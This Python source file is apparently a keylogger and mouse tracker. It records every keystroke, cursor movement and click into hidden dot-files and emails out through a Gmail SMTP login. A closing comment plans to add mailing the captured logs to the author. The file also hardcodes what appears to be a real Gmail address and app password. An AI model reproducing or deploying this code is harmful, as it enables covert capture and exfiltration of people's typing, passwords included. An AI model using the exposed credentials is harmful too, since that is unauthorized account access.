import keyboard
import pyautogui
import time
import threading
import datetime
import pynput
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication



def recordKeys():
    with open('.keys.txt', 'w') as file:
        logtime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
        file.write(f"LOGS: {logtime} \n\n")


    while True:
        try:
            key = keyboard.read_key()
            event = keyboard.is_pressed(hotkey=key)
            if event:
                with open('.keys.txt', 'a') as file:
                    clocktime = datetime.datetime.now().strftime("%r")
                    file.write(f"'{key}'  At {clocktime}\n")
        except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Key Records: \n{e}\n\n')    


def mouseMonitor():
    try:
        size = pyautogui.size()
        logtime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
        
        with open('.mouse.txt', 'w') as file:
            file.write(f"LOGS: {logtime} \n")
            file.write(f"Size: {size.width}x{size.height} \n\n")
        Xcopy, Ycopy = 0, 0
    except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Mouse Monitor first part: \n{e}\n\n') 


    while True:
        try:
            position = pyautogui.position()
            if position.x != Xcopy or position.y != Ycopy:
                with open('.mouse.txt', 'a') as file:
                    clocktime = datetime.datetime.now().strftime("%r")
                    file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
                    Xcopy, Ycopy = position.x, position.y
                    time.sleep(0.2)
        except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Mouse Monitoring: \n{e}\n\n') 

def clickcheck(x, y, button, pressed, injected):
    try:
        if pressed:
            position = pyautogui.position()
            clocktime = datetime.datetime.now().strftime("%r")
            with open('.mouse.txt', 'a') as file:
                file.write(f"Click '{button}': {position.x}   Y:{position.y}  At {clocktime} \n")
    except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Click checking: \n{e}\n\n') 



def sendMails():
    clocktime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    server.login("tvboxhome00406@gmail.com", password="dzzkllpbvprpbpfm")
    server.sendmail("tvboxhome00406@gmail.com", "dhyeylukhi95@gmail.com", msg=clocktime)



if __name__ == "__main__":
    print("Hello user...")
    print("I want to record some keys from your keyboard")

    keyboardThread = threading.Thread(target=recordKeys)
    mouseThread = threading.Thread(target=mouseMonitor)
    mailThread = threading.Thread(target=sendMails)

    keyboardThread.start()
    mouseThread.start()
    mailThread.start()

    with pynput.mouse.Listener(on_click=clickcheck) as clickread:
        keyboardThread.join()
        mouseThread.join()
        clickread.join()
        mailThread.join()



# almost everything is perfect

# just check the final working condition, and don't forgot to add the function which can send the files and error hadnling logs to your email